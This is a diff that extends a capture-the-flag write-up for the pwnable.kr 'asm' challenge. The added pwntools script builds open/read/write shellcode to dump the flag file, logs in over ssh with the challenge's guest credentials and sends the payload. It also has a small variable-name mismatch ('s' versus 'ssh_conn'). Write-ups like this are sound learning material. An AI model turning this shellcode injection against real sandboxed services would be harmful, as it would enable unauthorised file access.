@@ -64,7 +64,7 @@ int main(int argc, char* argv[]){
 
 Seems like were put in a sandbox where i can only use very basic syscalls. the goal is to pass raw bytes into executable memory.`read(0, sh+offset, 1000);` the program reads raw bytes from stdin into executable memory. I believe i have to create a program that somehow reads the file and writes it to stdout. Ill start by reading more about the syscalls i have access too, what they take in, what they recieve and perhaps how to write a small program without needing to write directly the assembly.
 
-### open: 
+### open:
 
 the open syscall recieves a filename and flags (Read Only, Write Only, Create if doesnt exist, etc). the function returns the File descriptor to the file. `open(const char  *pathname, int flags);` this function will utilize us opening the flag file in memory.
 
@@ -76,5 +76,50 @@ The read syscall recieves a file descriptor fd, a buffer and a max size X, and r
 
 the Write syscall recieves a file descriptor a buffer and a size and writes X bytes from the buffer into the file. this can be used to write to stdout (fd 1) very easily!!! in our case we will use all 3 syscalls i wrote about to read the contents from the flag file and write it to stdout
 
-
 Instead of writing raw assembly, ill use shellcraft from pwntools which generates the shellcode for me from simple instructions.
+
+well start with configuring th e environment
+
+```
+from pwn import *
+context.arch = 'amd64'
+```
+
+now well start with opening the flag file
+
+```
+x = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
+
+sc = shellcraft.open(x) #ill store it in a variable so its readable lol
+```
+
+next ill read from the open file and store it in a buffer (ill use rsp)
+
+```
+sc += shellcraft.read('rax', 'rsp', 64) #reads from the flag fd,
+```
+
+and lastly ill write to standard out (fd 1)
+
+```
+sc += shellcraft.write(1, 'rsp', 64)
+```
+
+Now ill compile that code using the pwntools `asm()` function and pass it through the basic ssh configuration i did before (We have to add the nc to run this executable with the right perms as stated in the readme)
+
+```
+payload = asm(sc)
+
+s = ssh(host='pwnable.kr', port=2222, user='asm', password='guest') # open basic connection
+p = ssh_conn.run('nc 0 9026') # connect to asm_pwn like they say in readme
+
+p.recvuntil(b'shellcode: ')
+p.send(payload)
+p.interactive()
+```
+
+And that should be it, ill try.
+
+It worked!!!!!!!!
+
+![1773599567354](images/readme/1773599567354.png)
